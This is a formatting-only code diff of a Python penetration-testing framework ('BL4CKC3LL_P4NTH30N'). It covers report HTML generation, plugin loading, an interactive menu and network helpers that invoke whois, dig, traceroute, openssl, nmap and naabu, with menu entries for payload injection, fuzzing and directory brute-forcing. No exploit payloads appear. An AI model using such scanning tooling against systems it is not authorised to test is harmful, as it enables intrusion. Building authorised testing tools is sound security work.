                 <h2>📋 Executive Narrative</h2>
                 
                 <div class="narrative-container">
             """
-            
+
             for section in storyline:
                 section_name = section.get("section", "Unknown")
                 content = section.get("content", "")
@@ -6711,7 +8492,7 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     <p>{esc(content)}</p>
                 </div>
                 """
-            
+
             # Board summary
             if board_summary:
                 html += f"""
@@ -6724,38 +8505,43 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     </div>
                 </div>
                 """
-            
+
             html += """
                 </div>
             </div>
             """
             return html
-        
+
         # Generate remediation roadmap section
         def generate_remediation_html() -> str:
             if not remediation_roadmap:
                 return ""
-            
+
             html = """
             <div class="section">
                 <h2>🚀 Remediation Roadmap</h2>
                 
                 <div class="roadmap-container">
             """
-            
-            roadmap_phases = ["immediate_actions", "short_term", "medium_term", "long_term"]
+
+            roadmap_phases = [
+                "immediate_actions",
+                "short_term",
+                "medium_term",
+                "long_term",
+            ]
             phase_names = {
                 "immediate_actions": "🚨 Immediate Actions (0-24h)",
                 "short_term": "🔥 Short Term (1-7 days)",
                 "medium_term": "⚡ Medium Term (1-4 weeks)",
-                "long_term": "🏗️ Long Term (1-3 months)"
+                "long_term": "🏗️ Long Term (1-3 months)",
             }
-            
+
             for phase in roadmap_phases:
                 phase_data = remediation_roadmap.get(phase, {})
                 if not phase_data or not phase_data.get("actions"):
                     continue
-                
+
                 html += f"""
                 <div class="roadmap-phase">
                     <h3>{phase_names.get(phase, phase.title())}</h3>
@@ -6764,8 +8550,10 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                     
                     <div class="action-list">
                 """
-                
-                for action in phase_data.get("actions", [])[:5]:  # Top 5 actions per phase
+
+                for action in phase_data.get("actions", [])[
+                    :5
+                ]:  # Top 5 actions per phase
                     html += f"""
                     <div class="action-item">
                         <strong>{esc(action.get('vulnerability', 'Unknown'))}</strong>
@@ -6774,18 +8562,18 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                         <p class="justification">{esc(action.get('justification', ''))}</p>
                     </div>
                     """
-                
+
                 html += """
                     </div>
                 </div>
                 """
-            
+
             html += """
                 </div>
             </div>
             """
             return html
-        
+
         # Generate the main HTML structure
         html_content = f"""<!DOCTYPE html>
 <html>
@@ -6998,12 +8786,12 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                 <h3>🚨 Immediate Actions</h3>
                 <ul>
         """
-        
+
         # Add immediate recommendations
         immediate_actions = recommendations.get("immediate_actions", [])
         for action in immediate_actions[:5]:
             html_content += f"<li>{esc(action)}</li>"
-        
+
         html_content += """
                 </ul>
             </div>
@@ -7012,12 +8800,12 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                 <h3>🏗️ Strategic Initiatives</h3>
                 <ul>
         """
-        
+
         # Add strategic recommendations
         strategic_initiatives = recommendations.get("strategic_initiatives", [])
         for initiative in strategic_initiatives[:5]:
             html_content += f"<li>{esc(initiative)}</li>"
-        
+
         html_content += """
                 </ul>
             </div>
@@ -7026,12 +8814,12 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
                 <h3>📊 Monitoring Improvements</h3>
                 <ul>
         """
-        
+
         # Add monitoring recommendations
         monitoring_improvements = recommendations.get("monitoring_improvements", [])
         for improvement in monitoring_improvements[:5]:
             html_content += f"<li>{esc(improvement)}</li>"
-        
+
         html_content += f"""
                 </ul>
             </div>
@@ -7055,11 +8843,11 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
 </body>
 </html>
         """
-        
+
         # Write the enhanced HTML report
         atomic_write(report_dir / "intelligent_report.html", html_content)
         logger.log("Enhanced intelligent HTML report generated successfully", "SUCCESS")
-        
+
     except Exception as e:
         logger.log(f"Enhanced intelligent HTML report generation failed: {e}", "ERROR")
         # Create a basic fallback HTML
@@ -7074,18 +8862,20 @@ def generate_enhanced_intelligent_html_report(enhanced_report_data: Dict[str, An
 </html>"""
         atomic_write(report_dir / "intelligent_report.html", fallback_html)
 
+
 # ---------- Plugin Management ----------
 @monitor_performance("plugin_loading")
 def find_plugins() -> Dict[str, Any]:
     """Discover and return available plugins"""
     return load_plugins()
 
+
 def load_plugin(plugin_name: str) -> Any:
     """Load a specific plugin by name"""
     plugin_file = PLUGINS_DIR / f"{plugin_name}.py"
     if not plugin_file.exists():
         raise FileNotFoundError(f"Plugin not found: {plugin_name}")
-    
+
     try:
         spec = importlib.util.spec_from_file_location(plugin_name, plugin_file)
         if spec and spec.loader:
@@ -7094,6 +8884,7 @@ def load_plugin(plugin_name: str) -> Any:
             return module
     except Exception as e:
         raise ImportError(f"Failed to load plugin {plugin_name}: {e}")
+
 
 @monitor_performance("plugin_loading")
 def load_plugins() -> Dict[str, Any]:
@@ -7108,13 +8899,21 @@ def load_plugins() -> Dict[str, Any]:
                 module = importlib.util.module_from_spec(spec)
                 spec.loader.exec_module(module)  # type: ignore
                 if hasattr(module, "plugin_info") and hasattr(module, "execute"):
-                    plugins[plugin_file.stem] = {"info": module.plugin_info, "execute": module.execute, "enabled": True}
+                    plugins[plugin_file.stem] = {
+                        "info": module.plugin_info,
+                        "execute": module.execute,
+                        "enabled": True,
+                    }
                     logger.log(f"Loaded plugin: {plugin_file.stem}", "INFO")
                 else:
-                    logger.log(f"Plugin missing required symbols: {plugin_file.stem}", "WARNING")
+                    logger.log(
+                        f"Plugin missing required symbols: {plugin_file.stem}",
+                        "WARNING",
+                    )
         except Exception as e:
             logger.log(f"Plugin load failed {plugin_file.stem}: {e}", "ERROR")
     return plugins
+
 
 def create_plugin_template(plugin_name: str):
     template = """# Plugin: {plugin_name}
@@ -7135,9 +8934,14 @@ def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
     print(f"[PLUGIN] Wrote: {{out}}")
 """
     atomic_write(PLUGINS_DIR / f"{plugin_name}.py", template)
-    logger.log(f"Plugin template created: {PLUGINS_DIR / (plugin_name + '.py')}", "SUCCESS")
+    logger.log(
+        f"Plugin template created: {PLUGINS_DIR / (plugin_name + '.py')}", "SUCCESS"
+    )
 
-def execute_plugin(plugin_name: str, run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def execute_plugin(
+    plugin_name: str, run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     plugins = load_plugins()
     if plugin_name in plugins and plugins[plugin_name].get("enabled", False):
         try:
@@ -7147,6 +8951,7 @@ def execute_plugin(plugin_name: str, run_dir: Path, env: Dict[str, str], cfg: Di
             logger.log(f"Plugin error {plugin_name}: {e}", "ERROR")
     else:
         logger.log(f"Plugin not found/enabled: {plugin_name}", "WARNING")
+
 
 # ---------- Menu ----------
 BANNER = r"""
@@ -7158,10 +8963,15 @@ BANNER = r"""
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝
 """
 
+
 def display_menu():
-    print("\n\033[31m" + "="*80 + "\033[0m")
-    print("\033[91m" + "BL4CKC3LL_P4NTH30N - ENHANCED SECURITY TESTING FRAMEWORK".center(80) + "\033[0m")
-    print("\033[31m" + "="*80 + "\033[0m")
+    print("\n\033[31m" + "=" * 80 + "\033[0m")
+    print(
+        "\033[91m"
+        + "BL4CKC3LL_P4NTH30N - ENHANCED SECURITY TESTING FRAMEWORK".center(80)
+        + "\033[0m"
+    )
+    print("\033[31m" + "=" * 80 + "\033[0m")
     print("\033[93m1. [TARGET] Enhanced Target Management\033[0m")
     print("\033[93m2. [REFRESH] Refresh Sources + Merge Wordlists\033[0m")
     print("\033[93m3. [RECON] Enhanced Reconnaissance\033[0m")
@@ -7190,7 +9000,8 @@ def display_menu():
     print("\033[94m26. [PAYINJECT] Automated Payload Injection\033[0m")
     print("\033[94m27. [FUZZ] Comprehensive Advanced Fuzzing\033[0m")
     print("\033[91m28. [EXIT] Exit\033[0m")
-    print("\033[31m" + "="*80 + "\033[0m")
+    print("\033[31m" + "=" * 80 + "\033[0m")
+
 
 def get_choice() -> int:
     """Enhanced choice input with help and shortcuts"""
@@ -7199,20 +9010,20 @@ def get_choice() -> int:
             prompt = "\n\033[93mSelect (1-28)\033[0m"
             prompt += "\033[90m [h=help, s=status, q=quit]: \033[0m"
             s = input(prompt).strip().lower()
-            
+
             # Handle shortcuts
-            if s in ['h', 'help']:
+            if s in ["h", "help"]:
                 show_enhanced_help()
                 continue
-            elif s in ['s', 'status']:
+            elif s in ["s", "status"]:
                 show_quick_status()
                 continue
-            elif s in ['q', 'quit', 'exit']:
+            elif s in ["q", "quit", "exit"]:
                 return 28
-            elif s == '':
+            elif s == "":
                 print("\033[91mPlease enter a choice (1-28) or 'h' for help\033[0m")
                 continue
-            
+
             # Handle numeric input
             if s.isdigit():
                 n = int(s)
@@ -7221,8 +9032,10 @@ def get_choice() -> int:
                 else:
                     print(f"\033[91mInvalid choice: {n}. Please select 1-28\033[0m")
             else:
-                print(f"\033[91mInvalid input: '{s}'. Please enter a number 1-28 or 'h' for help\033[0m")
-                
+                print(
+                    f"\033[91mInvalid input: '{s}'. Please enter a number 1-28 or 'h' for help\033[0m"
+                )
+
     except (EOFError, KeyboardInterrupt):
         print("\n\033[93mReceived interrupt signal. Exiting...\033[0m")
         return 28
@@ -7231,84 +9044,93 @@ def get_choice() -> int:
         print(f"\033[91mInput error: {e}\033[0m")
     return 0
 
+
 def show_enhanced_help():
     """Show enhanced help information"""
     print(f"\n\033[96m{'='*80}\033[0m")
     print("\033[96mBL4CKC3LL_P4NTH30N - HELP & QUICK REFERENCE".center(80) + "\033[0m")
     print(f"\033[96m{'='*80}\033[0m")
-    
+
     print("\n\033[95m🔧 ESSENTIAL OPERATIONS:\033[0m")
     print("  1  → Target Management     | Add/edit authorized targets")
-    print("  2  → Refresh Sources       | Update wordlists and sources")  
+    print("  2  → Refresh Sources       | Update wordlists and sources")
     print("  5  → Full Pipeline         | Complete recon + scan + report")
     print("  7  → Generate Report       | Create detailed findings report")
     print("  23 → Tool Status           | Check installed security tools")
-    
+
     print("\n\033[94m🔍 RECONNAISSANCE & SCANNING:\033[0m")
     print("  3  → Reconnaissance        | Subdomain discovery and enumeration")
     print("  4  → Vulnerability Scan    | Security vulnerability assessment")
     print("  11 → Network Analysis      | Advanced network scanning")
     print("  24 → BCAR Enhanced Recon   | Certificate-based reconnaissance")
-    
+
     print("\n\033[93m⚡ QUICK SCAN PRESETS:\033[0m")
     print("  6  → Preset Configurations | Fast, thorough, stealth modes")
     print("  20 → Automated Chain       | Fully automated testing sequence")
-    
+
     print("\n\033[92m🛠️  ADVANCED FEATURES:\033[0m")
     print("  21 → TUI Interface         | Terminal User Interface")
     print("  13 → AI Analysis           | AI-powered vulnerability analysis")
     print("  14 → Cloud Security        | AWS/Azure/GCP security assessment")
     print("  15 → API Security          | REST/GraphQL API testing")
-    
+
     print("\n\033[91m🔐 SPECIALIZED TESTING:\033[0m")
     print("  25 → Subdomain Takeover    | Advanced takeover detection")
     print("  26 → Payload Injection     | Automated payload testing")
     print("  27 → Advanced Fuzzing      | Comprehensive fuzzing operations")
-    
+
     print("\n\033[90m💡 QUICK TIPS:\033[0m")
     print("  • First time? Try: 1 → 2 → 5 → 7 (setup targets → full scan → report)")
     print("  • Tool issues? Use option 23 to check tool status")
     print("  • Need help? Type 'h' anytime for this help menu")
     print("  • Want to quit? Type 'q' or use option 28")
-    
+
     print(f"\n\033[96m{'='*80}\033[0m")
+
 
 def show_quick_status():
     """Show quick system status"""
     print(f"\n\033[96m{'='*40}\033[0m")
     print("\033[96mQUICK STATUS".center(40) + "\033[0m")
     print(f"\033[96m{'='*40}\033[0m")
-    
+
     # Check targets
     targets = read_lines(TARGETS)
     print(f"📋 Targets configured: \033[93m{len(targets)}\033[0m")
-    
+
     # Check recent runs
     runs_dir = Path(RUNS_DIR)
     if runs_dir.exists():
-        recent_runs = sorted([d for d in runs_dir.iterdir() if d.is_dir()], 
-                           key=lambda x: x.stat().st_mtime, reverse=True)[:3]
+        recent_runs = sorted(
+            [d for d in runs_dir.iterdir() if d.is_dir()],
+            key=lambda x: x.stat().st_mtime,
+            reverse=True,
+        )[:3]
         print(f"📊 Recent runs: \033[93m{len(recent_runs)}\033[0m")
         for run in recent_runs:
-            mtime = datetime.fromtimestamp(run.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
+            mtime = datetime.fromtimestamp(run.stat().st_mtime).strftime(
+                "%Y-%m-%d %H:%M"
+            )
             print(f"   └─ {run.name} ({mtime})")
     else:
         print("📊 Recent runs: \033[93m0\033[0m")
-    
+
     # Quick tool check
     core_tools = ["subfinder", "httpx", "naabu", "nuclei", "nmap"]
     available = sum(1 for tool in core_tools if which(tool))
     print(f"🔧 Core tools: \033[93m{available}/{len(core_tools)}\033[0m available")
-    
+
     # Memory usage
     try:
         import psutil
+
         memory = psutil.virtual_memory()
         print(f"💾 Memory usage: \033[93m{memory.percent:.1f}%\033[0m")
     except ImportError:
         print("💾 Memory usage: \033[90mN/A\033[0m")
-    
+
     print(f"\033[96m{'='*40}\033[0m")
+
 
 def run_full_pipeline():
     """Run the complete pipeline: recon -> vuln scan -> report"""
@@ -7347,12 +9169,13 @@ def run_full_pipeline():
     finally:
         cleanup_resource_monitor(stop_event, th)
 
+
 def settings_menu():
     """Enhanced settings and configuration menu"""
     while True:
-        print("\n\033[31m" + "="*80 + "\033[0m")
+        print("\n\033[31m" + "=" * 80 + "\033[0m")
         print("\033[91m" + "SETTINGS & CONFIGURATION".center(80) + "\033[0m")
-        print("\033[31m" + "="*80 + "\033[0m")
+        print("\033[31m" + "=" * 80 + "\033[0m")
         print("\033[93m1. [TECH] View Current Configuration\033[0m")
         print("\033[93m2. ⚙️ Scan Settings\033[0m")
         print("\033[93m3. [REPORT] Report Settings\033[0m")
@@ -7384,7 +9207,12 @@ def settings_menu():
                 configure_security_settings(cfg)
 
             elif choice == "6":
-                if input("\n[WARNING] Reset all settings to defaults? (yes/no): ").lower() == "yes":
+                if (
+                    input(
+                        "\n[WARNING] Reset all settings to defaults? (yes/no): "
+                    ).lower()
+                    == "yes"
+                ):
                     save_cfg(DEFAULT_CFG)
                     logger.log("Configuration reset to defaults", "SUCCESS")
 
@@ -7397,6 +9225,7 @@ def settings_menu():
 
         except Exception as e:
             logger.log(f"Settings error: {e}", "ERROR")
+
 
 def configure_scan_settings(cfg: Dict[str, Any]):
     """Configure scanning-related settings"""
@@ -7430,13 +9259,17 @@ def configure_scan_settings(cfg: Dict[str, Any]):
             ("technology_detection", "Technology Detection"),
             ("subdomain_takeover", "Subdomain Takeover Check"),
             ("cors_analysis", "CORS Analysis"),
-            ("security_headers", "Security Headers Check")
+            ("security_headers", "Security Headers Check"),
         ]:
             current = cfg["advanced_scanning"].get(key, True)
-            response = input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ").strip().lower()
-            if response in ['y', 'yes']:
+            response = (
+                input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ")
+                .strip()
+                .lower()
+            )
+            if response in ["y", "yes"]:
                 cfg["advanced_scanning"][key] = True
-            elif response in ['n', 'no']:
+            elif response in ["n", "no"]:
                 cfg["advanced_scanning"][key] = False
 
         save_cfg(cfg)
@@ -7444,6 +9277,7 @@ def configure_scan_settings(cfg: Dict[str, Any]):
 
     except Exception as e:
         logger.log(f"Error updating scan settings: {e}", "ERROR")
+
 
 def configure_report_settings(cfg: Dict[str, Any]):
     """Configure reporting settings"""
@@ -7456,21 +9290,27 @@ def configure_report_settings(cfg: Dict[str, Any]):
         print("Available: html, json, csv, sari")
         new_formats = input("Report formats (comma-separated): ").strip()
         if new_formats:
-            cfg["report"]["formats"] = [f.strip() for f in new_formats.split(',')]
+            cfg["report"]["formats"] = [f.strip() for f in new_formats.split(",")]
 
         # Auto-open HTML
         current_auto_open = cfg["report"]["auto_open_html"]
-        response = input(f"Auto-open HTML report ({'yes' if current_auto_open else 'no'}) [y/n]: ").strip().lower()
-        if response in ['y', 'yes']:
+        response = (
+            input(
+                f"Auto-open HTML report ({'yes' if current_auto_open else 'no'}) [y/n]: "
+            )
+            .strip()
+            .lower()
+        )
+        if response in ["y", "yes"]:
             cfg["report"]["auto_open_html"] = True
-        elif response in ['n', 'no']:
+        elif response in ["n", "no"]:
             cfg["report"]["auto_open_html"] = False
 
         # Risk scoring
         response = input("Enable risk scoring [y/n]: ").strip().lower()
-        if response in ['y', 'yes']:
+        if response in ["y", "yes"]:
             cfg["report"]["risk_scoring"] = True
-        elif response in ['n', 'no']:
+        elif response in ["n", "no"]:
             cfg["report"]["risk_scoring"] = False
 
         save_cfg(cfg)
@@ -7478,6 +9318,7 @@ def configure_report_settings(cfg: Dict[str, Any]):
 
     except Exception as e:
         logger.log(f"Error updating report settings: {e}", "ERROR")
+
 
 def configure_network_settings(cfg: Dict[str, Any]):
     """Configure network analysis settings"""
@@ -7489,13 +9330,17 @@ def configure_network_settings(cfg: Dict[str, Any]):
             ("whois_lookup", "WHOIS Lookup"),
             ("reverse_dns", "Reverse DNS Lookup"),
             ("asn_lookup", "ASN Lookup"),
-            ("geolocation", "Geolocation Analysis")
+            ("geolocation", "Geolocation Analysis"),
         ]:
             current = cfg["network_analysis"].get(key, True)
-            response = input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ").strip().lower()
-            if response in ['y', 'yes']:
+            response = (
+                input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ")
+                .strip()
+                .lower()
+            )
+            if response in ["y", "yes"]:
                 cfg["network_analysis"][key] = True
-            elif response in ['n', 'no']:
+            elif response in ["n", "no"]:
                 cfg["network_analysis"][key] = False
 
         save_cfg(cfg)
@@ -7503,6 +9348,7 @@ def configure_network_settings(cfg: Dict[str, Any]):
 
     except Exception as e:
         logger.log(f"Error updating network settings: {e}", "ERROR")
+
 
 def configure_security_settings(cfg: Dict[str, Any]):
     """Configure security-related settings"""
@@ -7513,13 +9359,17 @@ def configure_security_settings(cfg: Dict[str, Any]):
         for key, description in [
             ("enable_dirb", "Directory Brute Force (dirb)"),
             ("enable_gobuster", "Directory Brute Force (gobuster)"),
-            ("enable_ffu", "Fast Web Fuzzer (ffuf)")
+            ("enable_ffu", "Fast Web Fuzzer (ffuf)"),
         ]:
             current = cfg["fuzzing"].get(key, True)
-            response = input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ").strip().lower()
-            if response in ['y', 'yes']:
+            response = (
+                input(f"{description} ({'enabled' if current else 'disabled'}) [y/n]: ")
+                .strip()
+                .lower()
+            )
+            if response in ["y", "yes"]:
                 cfg["fuzzing"][key] = True
-            elif response in ['n', 'no']:
+            elif response in ["n", "no"]:
                 cfg["fuzzing"][key] = False
 
         # Resource management
@@ -7527,7 +9377,7 @@ def configure_security_settings(cfg: Dict[str, Any]):
         for key, description, default in [
             ("cpu_threshold", "CPU Threshold (%)", 85),
             ("memory_threshold", "Memory Threshold (%)", 90),
-            ("disk_threshold", "Disk Threshold (%)", 95)
+            ("disk_threshold", "Disk Threshold (%)", 95),
         ]:
             current = cfg["resource_management"].get(key, default)
             new_value = input(f"{description} ({current}): ").strip()
@@ -7540,12 +9390,13 @@ def configure_security_settings(cfg: Dict[str, Any]):
     except Exception as e:
         logger.log(f"Error updating security settings: {e}", "ERROR")
 
+
 def network_tools_menu():
     """Network analysis tools menu"""
     while True:
-        print("\n\033[31m" + "="*80 + "\033[0m")
+        print("\n\033[31m" + "=" * 80 + "\033[0m")
         print("\033[91m" + "NETWORK ANALYSIS TOOLS".center(80) + "\033[0m")
-        print("\033[31m" + "="*80 + "\033[0m")
+        print("\033[31m" + "=" * 80 + "\033[0m")
         print("\033[93m1. 🌐 WHOIS Lookup\033[0m")
         print("\033[93m2. [RECON] DNS Enumeration\033[0m")
         print("\033[93m3. 🛣️ Traceroute Analysis\033[0m")
@@ -7593,11 +9444,14 @@ def network_tools_menu():
         except Exception as e:
             logger.log(f"Network tools error: {e}", "ERROR")
 
+
 def perform_whois_lookup(target: str):
     """Perform WHOIS lookup"""
     try:
         if which("whois"):
-            result = run_cmd(["whois", target], capture=True, timeout=60, check_return=False)
+            result = run_cmd(
+                ["whois", target], capture=True, timeout=60, check_return=False
+            )
             if result.stdout:
                 print(f"\n\033[96m=== WHOIS Information for {target} ===\033[0m")
                 print(result.stdout)
@@ -7609,6 +9463,7 @@ def perform_whois_lookup(target: str):
         logger.log(f"WHOIS lookup error: {e}", "ERROR")
     input("\nPress Enter to continue...")
 
+
 def perform_dns_enumeration(domain: str):
     """Perform DNS enumeration"""
     record_types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA"]
@@ -7617,10 +9472,15 @@ def perform_dns_enumeration(domain: str):
 
     for record_type in record_types:
         try:
-            result = run_cmd(["dig", "+short", record_type, domain], capture=True, timeout=30, check_return=False)
+            result = run_cmd(
+                ["dig", "+short", record_type, domain],
+                capture=True,
+                timeout=30,
+                check_return=False,
+            )
             if result.stdout and result.stdout.strip():
                 print(f"\033[93m{record_type} Records:\033[0m")
-                for line in result.stdout.strip().split('\n'):
+                for line in result.stdout.strip().split("\n"):
                     print(f"  {line}")
                 print()
         except Exception as e:
@@ -7628,12 +9488,18 @@ def perform_dns_enumeration(domain: str):
 
     input("Press Enter to continue...")
 
+
 def perform_traceroute(target: str):
     """Perform traceroute analysis"""
     try:
         if which("traceroute"):
             print(f"\n\033[96m=== Traceroute to {target} ===\033[0m")
-            result = run_cmd(["traceroute", "-m", "15", target], capture=True, timeout=120, check_return=False)
+            result = run_cmd(
+                ["traceroute", "-m", "15", target],
+                capture=True,
+                timeout=120,
+                check_return=False,
+            )
             if result.stdout:
                 print(result.stdout)
             else:
@@ -7644,12 +9510,18 @@ def perform_traceroute(target: str):
         logger.log(f"Traceroute error: {e}", "ERROR")
     input("\nPress Enter to continue...")
 
+
 def perform_asn_lookup(ip: str):
     """Perform ASN lookup"""
     try:
         # Use WHOIS for ASN information
         if which("whois"):
-            result = run_cmd(["whois", "-h", "whois.cymru.com", f" -v {ip}"], capture=True, timeout=30, check_return=False)
+            result = run_cmd(
+                ["whois", "-h", "whois.cymru.com", f" -v {ip}"],
+                capture=True,
+                timeout=30,
+                check_return=False,
+            )
             if result.stdout:
                 print(f"\n\033[96m=== ASN Information for {ip} ===\033[0m")
                 print(result.stdout)
@@ -7661,6 +9533,7 @@ def perform_asn_lookup(ip: str):
         logger.log(f"ASN lookup error: {e}", "ERROR")
     input("\nPress Enter to continue...")
 
+
 def perform_ssl_analysis(target: str):
     """Perform SSL certificate analysis"""
     try:
@@ -7671,19 +9544,32 @@ def perform_ssl_analysis(target: str):
 
         print(f"\n\033[96m=== SSL Certificate Analysis for {hostname} ===\033[0m")
 
-        result = run_cmd([
-            "openssl", "s_client", "-connect", f"{hostname}:443",
-            "-servername", hostname, "-showcerts"
-        ], capture=True, timeout=30, check_return=False, use_shell=False)
+        result = run_cmd(
+            [
+                "openssl",
+                "s_client",
+                "-connect",
+                f"{hostname}:443",
+                "-servername",
+                hostname,
+                "-showcerts",
+            ],
+            capture=True,
+            timeout=30,
+            check_return=False,
+            use_shell=False,
+        )
 
         if result.stdout:
             # Extract certificate information
-            lines = result.stdout.split('\n')
+            lines = result.stdout.split("\n")
             cert_info = False
             for line in lines:
                 if "Certificate chain" in line:
                     cert_info = True
-                if cert_info and ("subject=" in line or "issuer=" in line or "verify" in line):
+                if cert_info and (
+                    "subject=" in line or "issuer=" in line or "verify" in line
+                ):
                     print(line)
         else:
             logger.log("No SSL certificate information found", "WARNING")
@@ -7691,6 +9577,7 @@ def perform_ssl_analysis(target: str):
     except Exception as e:
         logger.log(f"SSL analysis error: {e}", "ERROR")
     input("\nPress Enter to continue...")
+
 
 def perform_quick_port_scan(target: str):
     """Perform quick port scan"""
@@ -7700,17 +9587,23 @@ def perform_quick_port_scan(target: str):
         print(f"\n\033[96m=== Quick Port Scan for {hostname} ===\033[0m")
 
         if which("nmap"):
-            result = run_cmd([
-                "nmap", "-F", "--open", hostname
-            ], capture=True, timeout=120, check_return=False)
+            result = run_cmd(
+                ["nmap", "-F", "--open", hostname],
+                capture=True,
+                timeout=120,
+                check_return=False,
+            )
             if result.stdout:
                 print(result.stdout)
             else:
                 logger.log("No open ports found", "WARNING")
         elif which("naabu"):
-            result = run_cmd([
-                "naabu", "-host", hostname, "-top-ports", "1000"
-            ], capture=True, timeout=120, check_return=False)
+            result = run_cmd(
+                ["naabu", "-host", hostname, "-top-ports", "1000"],
+                capture=True,
+                timeout=120,
+                check_return=False,
+            )
             if result.stdout:
                 print(result.stdout)
             else:
@@ -7722,10 +9615,15 @@ def perform_quick_port_scan(target: str):
         logger.log(f"Port scan error: {e}", "ERROR")
     input("\nPress Enter to continue...")
 
+
 def security_assessment_summary():
     """Display security assessment summary from latest run"""
     try:
-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)
+        runs = sorted(
+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],
+            key=lambda p: p.stat().st_mtime,
+            reverse=True,
+        )
         if not runs:
             logger.log("No assessment runs found", "WARNING")
             return
@@ -7739,34 +9637,44 @@ def security_assessment_summary():
 
         report_data = json.loads(report_file.read_text())
 
-        print("\n\033[31m" + "="*80 + "\033[0m")
+        print("\n\033[31m" + "=" * 80 + "\033[0m")
         print("\033[91m" + "SECURITY ASSESSMENT SUMMARY".center(80) + "\033[0m")
-        print("\033[31m" + "="*80 + "\033[0m")
+        print("\033[31m" + "=" * 80 + "\033[0m")
 
         # Basic stats
         exec_summary = report_data.get("executive_summary", {})
         risk_assessment = report_data.get("risk_assessment", {})
 
         print(f"\033[93m[REPORT] Run ID:\033[0m {report_data.get('run_id', 'Unknown')}")
-        print(f"\033[93m[TARGET] Targets Scanned:\033[0m {exec_summary.get('targets_scanned', 0)}")
-        print(f"\033[93m[RECON] Subdomains Found:\033[0m {exec_summary.get('subdomains_discovered', 0)}")
-        print(f"\033[93m[PORTS] Open Ports:\033[0m {exec_summary.get('open_ports_found', 0)}")
-        print(f"\033[93m🌐 HTTP Services:\033[0m {exec_summary.get('http_services_identified', 0)}")
+        print(
+            f"\033[93m[TARGET] Targets Scanned:\033[0m {exec_summary.get('targets_scanned', 0)}"
+        )
+        print(
+            f"\033[93m[RECON] Subdomains Found:\033[0m {exec_summary.get('subdomains_discovered', 0)}"
+        )
+        print(
+            f"\033[93m[PORTS] Open Ports:\033[0m {exec_summary.get('open_ports_found', 0)}"
+        )
+        print(
+            f"\033[93m🌐 HTTP Services:\033[0m {exec_summary.get('http_services_identified', 0)}"
+        )
 
         # Risk assessment
-        risk_level = risk_assessment.get('risk_level', 'UNKNOWN')
+        risk_level = risk_assessment.get("risk_level", "UNKNOWN")
         risk_color = {
-            'CRITICAL': '\033[91m',  # Red
-            'HIGH': '\033[91m',      # Red
-            'MEDIUM': '\033[93m',    # Yellow
-            'LOW': '\033[92m',       # Green
-            'INFORMATIONAL': '\033[94m'  # Blue
-        }.get(risk_level, '\033[0m')
+            "CRITICAL": "\033[91m",  # Red
+            "HIGH": "\033[91m",  # Red
+            "MEDIUM": "\033[93m",  # Yellow
+            "LOW": "\033[92m",  # Green
+            "INFORMATIONAL": "\033[94m",  # Blue
+        }.get(risk_level, "\033[0m")
 
-        print(f"\n\033[93m[SECURITY] Overall Risk Level:\033[0m {risk_color}{risk_level}\033[0m")
+        print(
+            f"\n\033[93m[SECURITY] Overall Risk Level:\033[0m {risk_color}{risk_level}\033[0m"
+        )
 
         # Severity breakdown
-        severity_counts = risk_assessment.get('severity_breakdown', {})
+        severity_counts = risk_assessment.get("severity_breakdown", {})
         if any(severity_counts.values()):
             print("\n\033[93m[SUMMARY] Vulnerability Breakdown:\033[0m")
             print(f"  [ALERT] Critical: {severity_counts.get('critical', 0)}")
@@ -7776,30 +9684,33 @@ def security_assessment_summary():
             print(f"  ℹ️ Info: {severity_counts.get('info', 0)}")
 
         # Key findings
-        key_findings = exec_summary.get('key_findings', [])
+        key_findings = exec_summary.get("key_findings", [])
         if key_findings:
             print("\n\033[93m[RECON] Key Findings:\033[0m")
             for finding in key_findings[:5]:  # Show top 5
                 print(f"  • {finding}")
 
         # Recommendations
-        recommendations = risk_assessment.get('recommendations', [])
+        recommendations = risk_assessment.get("recommendations", [])
         if recommendations:
             print("\n\033[93m💡 Top Recommendations:\033[0m")
             for rec in recommendations[:5]:  # Show top 5
                 print(f"  • {rec}")
 
-        print(f"\n\033[93m📁 Full Report:\033[0m {latest_run / 'report' / 'report.html'}")
+        print(
+            f"\n\033[93m📁 Full Report:\033[0m {latest_run / 'report' / 'report.html'}"
+        )
 
     except Exception as e:
         logger.log(f"Error generating summary: {e}", "ERROR")
 
     input("\nPress Enter to continue...")
 
+
 def manage_targets():
-    print("\n\033[96m" + "="*80 + "\033[0m")
+    print("\n\033[96m" + "=" * 80 + "\033[0m")
     print("\033[96mENHANCED TARGET MANAGEMENT".center(80) + "\033[0m")
-    print("\033[96m" + "="*80 + "\033[0m")
+    print("\033[96m" + "=" * 80 + "\033[0m")
     print("\033[95m1. View Current Targets\033[0m")
     print("\033[95m2. Add Single Target\033[0m")
     print("\033[95m3. Add Multiple Targets (Bulk)\033[0m")
@@ -7836,6 +9747,7 @@ def manage_targets():
         logger.log(f"Error in target management: {e}", "ERROR")
         input("Press Enter to continue...")
 
+
 def view_current_targets():
     """Display all current targets with enhanced formatting"""
     ts = read_lines(TARGETS)
@@ -7850,6 +9762,7 @@ def view_current_targets():
             print(f"    {i:2d}. {status_icon} {t}")
     input("\nPress Enter to continue...")
 
+
 def add_single_target():
     """Add a single target with validation"""
